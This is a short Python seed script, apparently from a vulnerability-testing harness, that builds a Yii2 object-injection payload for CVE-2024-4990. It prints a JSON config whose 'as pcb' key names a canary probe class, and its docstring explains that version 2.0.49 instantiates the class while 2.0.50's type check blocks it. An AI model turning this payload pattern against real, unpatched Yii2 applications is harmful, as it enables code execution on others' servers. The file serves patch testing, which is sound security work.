#!/usr/bin/env python3
"""[GIVEN] CVE-2024-4990 seed exploit for deser_yii2_behavior_typecheck.

The DIRECT object-injection payload: an `as <name>` key whose value is a class-config array
naming an attacker class directly in `class`. On V0 (yii2 2.0.49) __set() passes the array
straight to Yii::createObject() -> app\\PcbFlagProbe is instantiated (constructor echoes the
canary). On V1 (2.0.50) the CVE-2024-4990 type check
`is_subclass_of($value['class'], Behavior::class)` refuses it (PcbFlagProbe is not a Behavior)
-> BLOCKED.
"""
import json


def candidate():
    return {
        "id": "original_direct_class",
        "config": json.dumps({
            "as pcb": {"class": "app\\PcbFlagProbe"}
        }),
    }


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
